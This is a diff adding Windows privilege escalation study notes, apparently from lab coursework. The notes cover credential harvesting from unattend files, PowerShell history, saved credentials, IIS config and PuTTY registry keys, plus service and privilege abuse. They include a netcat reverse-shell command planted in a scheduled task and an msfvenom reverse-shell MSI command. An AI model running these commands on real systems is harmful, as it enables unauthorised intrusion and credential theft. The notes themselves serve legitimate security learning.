@@ -3030,6 +3030,261 @@ Privilege Escalation
 
     Windows Privilege Escalation
 
-        _
+
+        Windows users
+
+            Any user with administrative privileges will be part of the Administrators group
+            On the other hand, standard users are part of the Users group
+
+
+        Special built-in accounts used by the operating system
+
+            SYSTEM / LocalSystem
+                Has full access to all files and resources available on the host with even higher privileges than administrators
+
+            Local Service
+                Default account used to run Windows services with "minimum" privileges
+                It will use anonymous connections over the network
+
+            Network Service
+                Default account used to run Windows services with "minimum" privileges
+                It will use the computer credentials to authenticate through the network
+
+
+
+        Harvesting passwords from usual spots
+
+
+            Unattended Windows installations
+
+                When installing Windows on a large number of hosts, administrators may use Windows Deployment Services,
+                which allows for a single operating system image to be deployed to several hosts through the network
+
+                    These kinds of installations are referred to as unattended installations as they don't require user interaction
+
+                        Such installations require the use of an administrator account to perform the initial setup,
+                        which might end up being stored in the machine in the following locations
+
+                            C:\Unattend.xml
+                            C:\Windows\Panther\Unattend.xml
+                            C:\Windows\Panther\Unattend\Unattend.xml
+                            C:\Windows\system32\sysprep.inf
+                            C:\Windows\system32\sysprep\sysprep.xml
+
+
+                                <Credentials>
+                                    <Username>Administrator</Username>
+                                    <Domain>thm.local</Domain>
+                                    <Password>MyPassword123</Password>
+                                </Credentials>
+
+
+            Powershell history
+
+                If a user runs a command that includes a password directly as part of the Powershell command line
+
+                    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+                        The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable
+                        To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile
+
+
+            Saved Windows credentials
+
+                Windows allows us to use other users' credentials
+                    This function also gives the option to save these credentials on the system
+
+                        cmdkey /list
+
+                While you can't see the actual passwords
+                    If you notice any credentials worth trying, you can use them with the runas command and the /savecred option
+
+                        runas /savecred /user:admin cmd.exe
+
+
+            Internet Information Services (IIS) configuration
+
+                The default web server on Windows installations
+
+                    The configuration of websites on IIS is stored in a file called web.config
+                        Can store passwords for databases or configured authentication mechanisms
+
+                        Depending on the installed version of IIS
+
+                            C:\inetpub\wwwroot\web.config
+                            C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+                        Here is a quick way to find database connection strings on the file
+
+                            type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+
+            Retrieve credentials from software
+                Any software that stores passwords will have methods to recover any passwords the user has saved
+
+
+                PuTTY is an SSH client commonly found on Windows systems
+
+                    Instead of having to specify a connection's parameters every single time
+                        Users can store sessions where the IP, user and other configurations can be stored for later use
+
+                        While PuTTY won't allow users to store their SSH password
+                            It will store proxy configurations that include cleartext authentication credentials
+
+                            You can search under the following registry key for ProxyPassword
+                                Simon Tatham is the creator of PuTTY (and his name is part of the path)
+
+                                reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+
+
+        Other quick wins
+
+
+            Scheduled tasks
+
+                You may see a scheduled task that either lost its binary or it's using a binary you can modify
+
+                    schtasks /query /tn <task_name> /fo list /v
+
+                        What matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled
+                        task and the "Run As User" parameter, which shows the user that will be used to execute the task
+
+                        If our current user can modify or overwrite the "Task to Run" executable,
+                        we can control what gets executed, resulting in a simple privilege escalation
+
+                            To check the file permissions on the executable
+
+                                icacls <task_path>
+
+                                    If the BUILTIN\Users group has full access (F) over the task's binary
+                                        This means we can modify the .bat file and insert any payload we like
+                                        Let's change the bat file to spawn a reverse shell
+
+                                            Windows target
+                                                echo <path_to>\nc64.exe -e cmd.exe <lhost> <lport> > <task_path>
+
+                                            Linux attacker
+                                                nc -lnvp <lport>
+
+
+                                            The next time the scheduled task runs, you should receive the reverse shell with the task privileges
+                                                While you probably wouldn't be able to start the task in a real scenario
+
+                                                    schtasks /run /tn <task_name>
+
+
+            AlwaysInstallElevated
+
+                Windows installer files (also known as .msi files) are used to install applications on the system
+
+                    They usually run with the privilege level of the user that starts it
+                        However, these can be configured to run with higher privileges from any user account (even unprivileged ones)
+                        This could potentially allow us to generate a malicious MSI file that would run with admin privileges
+
+                            reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+                            reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+                                If these are set, you can generate a malicious .msi file
+
+                                    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o <name>.msi
+
+
+
+        Abusing service misconfigurations
+
+
+            Windows services
+
+                Managed by the Service Control Manager (SCM)
+
+                    A process in charge of
+                        Managing the state of services as needed
+                        Checking the current status of any given service
+                        Providing a way to configure services
+
+                Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started
+
+                    sc qc <service_name>
+
+
+            Unquoted service paths
+
+                When we can't directly write into service executables as before
+                    There might still be a chance to force a service into running arbitrary executables
+                    A very particular behaviour occurs when the service is configured to point to an "unquoted" executable
+                         By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command
+
+
+                    PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt
+                    Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string
+
+                        sc qc "disk sorter enterprise"
+
+                            Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries
+
+                                ...\Disk.exe
+                                ...\Disk Sorter.exe
+                                ...
+
+                            If an attacker creates any of the executables that are searched for before the expected service executable
+                                They can force the service to run an arbitrary executable
+
+
+                            Most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default,
+                            which isn't writable by unprivileged users, this prevents any vulnerable service from being exploited
+
+                                There are exceptions to this rule
+                                    Some installers change the permissions on the installed folders, making the services vulnerable
+
+                                        An administrator might decide to install the service binaries in a non-default path
+                                            If such a path is world-writable, the vulnerability can be exploited
+
+
+            Insecure service permissions
+
+                Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service
+                    You will be able to reconfigure the service
+                        Allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself
+
+                To check for a service Discretionary Access Control List (DACL) from the command line
+                    You can use accesschk from the Sysinternals suite
+
+
+
+        Abusing dangerous privileges
+
+
+            Windows privileges
+
+                whoami /priv
+
+
+            SeBackup / SeRestore
+
+                The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place
+                    Allow certain users to perform backups from a system without requiring full administrative privileges
+                    An attacker can trivially escalate privileges on the system by using many techniques
+
+
+            SeTakeOwnership
+
+                The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys
+                    Opening up many possibilities for an attacker to elevate privileges
+
+
+            SeImpersonate / SeAssignPrimaryToken
+
+                These privileges allow a process to impersonate other users and act on their behalf
+                    Impersonation usually consists of being able to spawn a process or thread under the security context of another user
+
+
+
+        Abusing vulnerable software
+
+
+            Unpatched software
+
+                wmic product get name,version,vendor
 
 
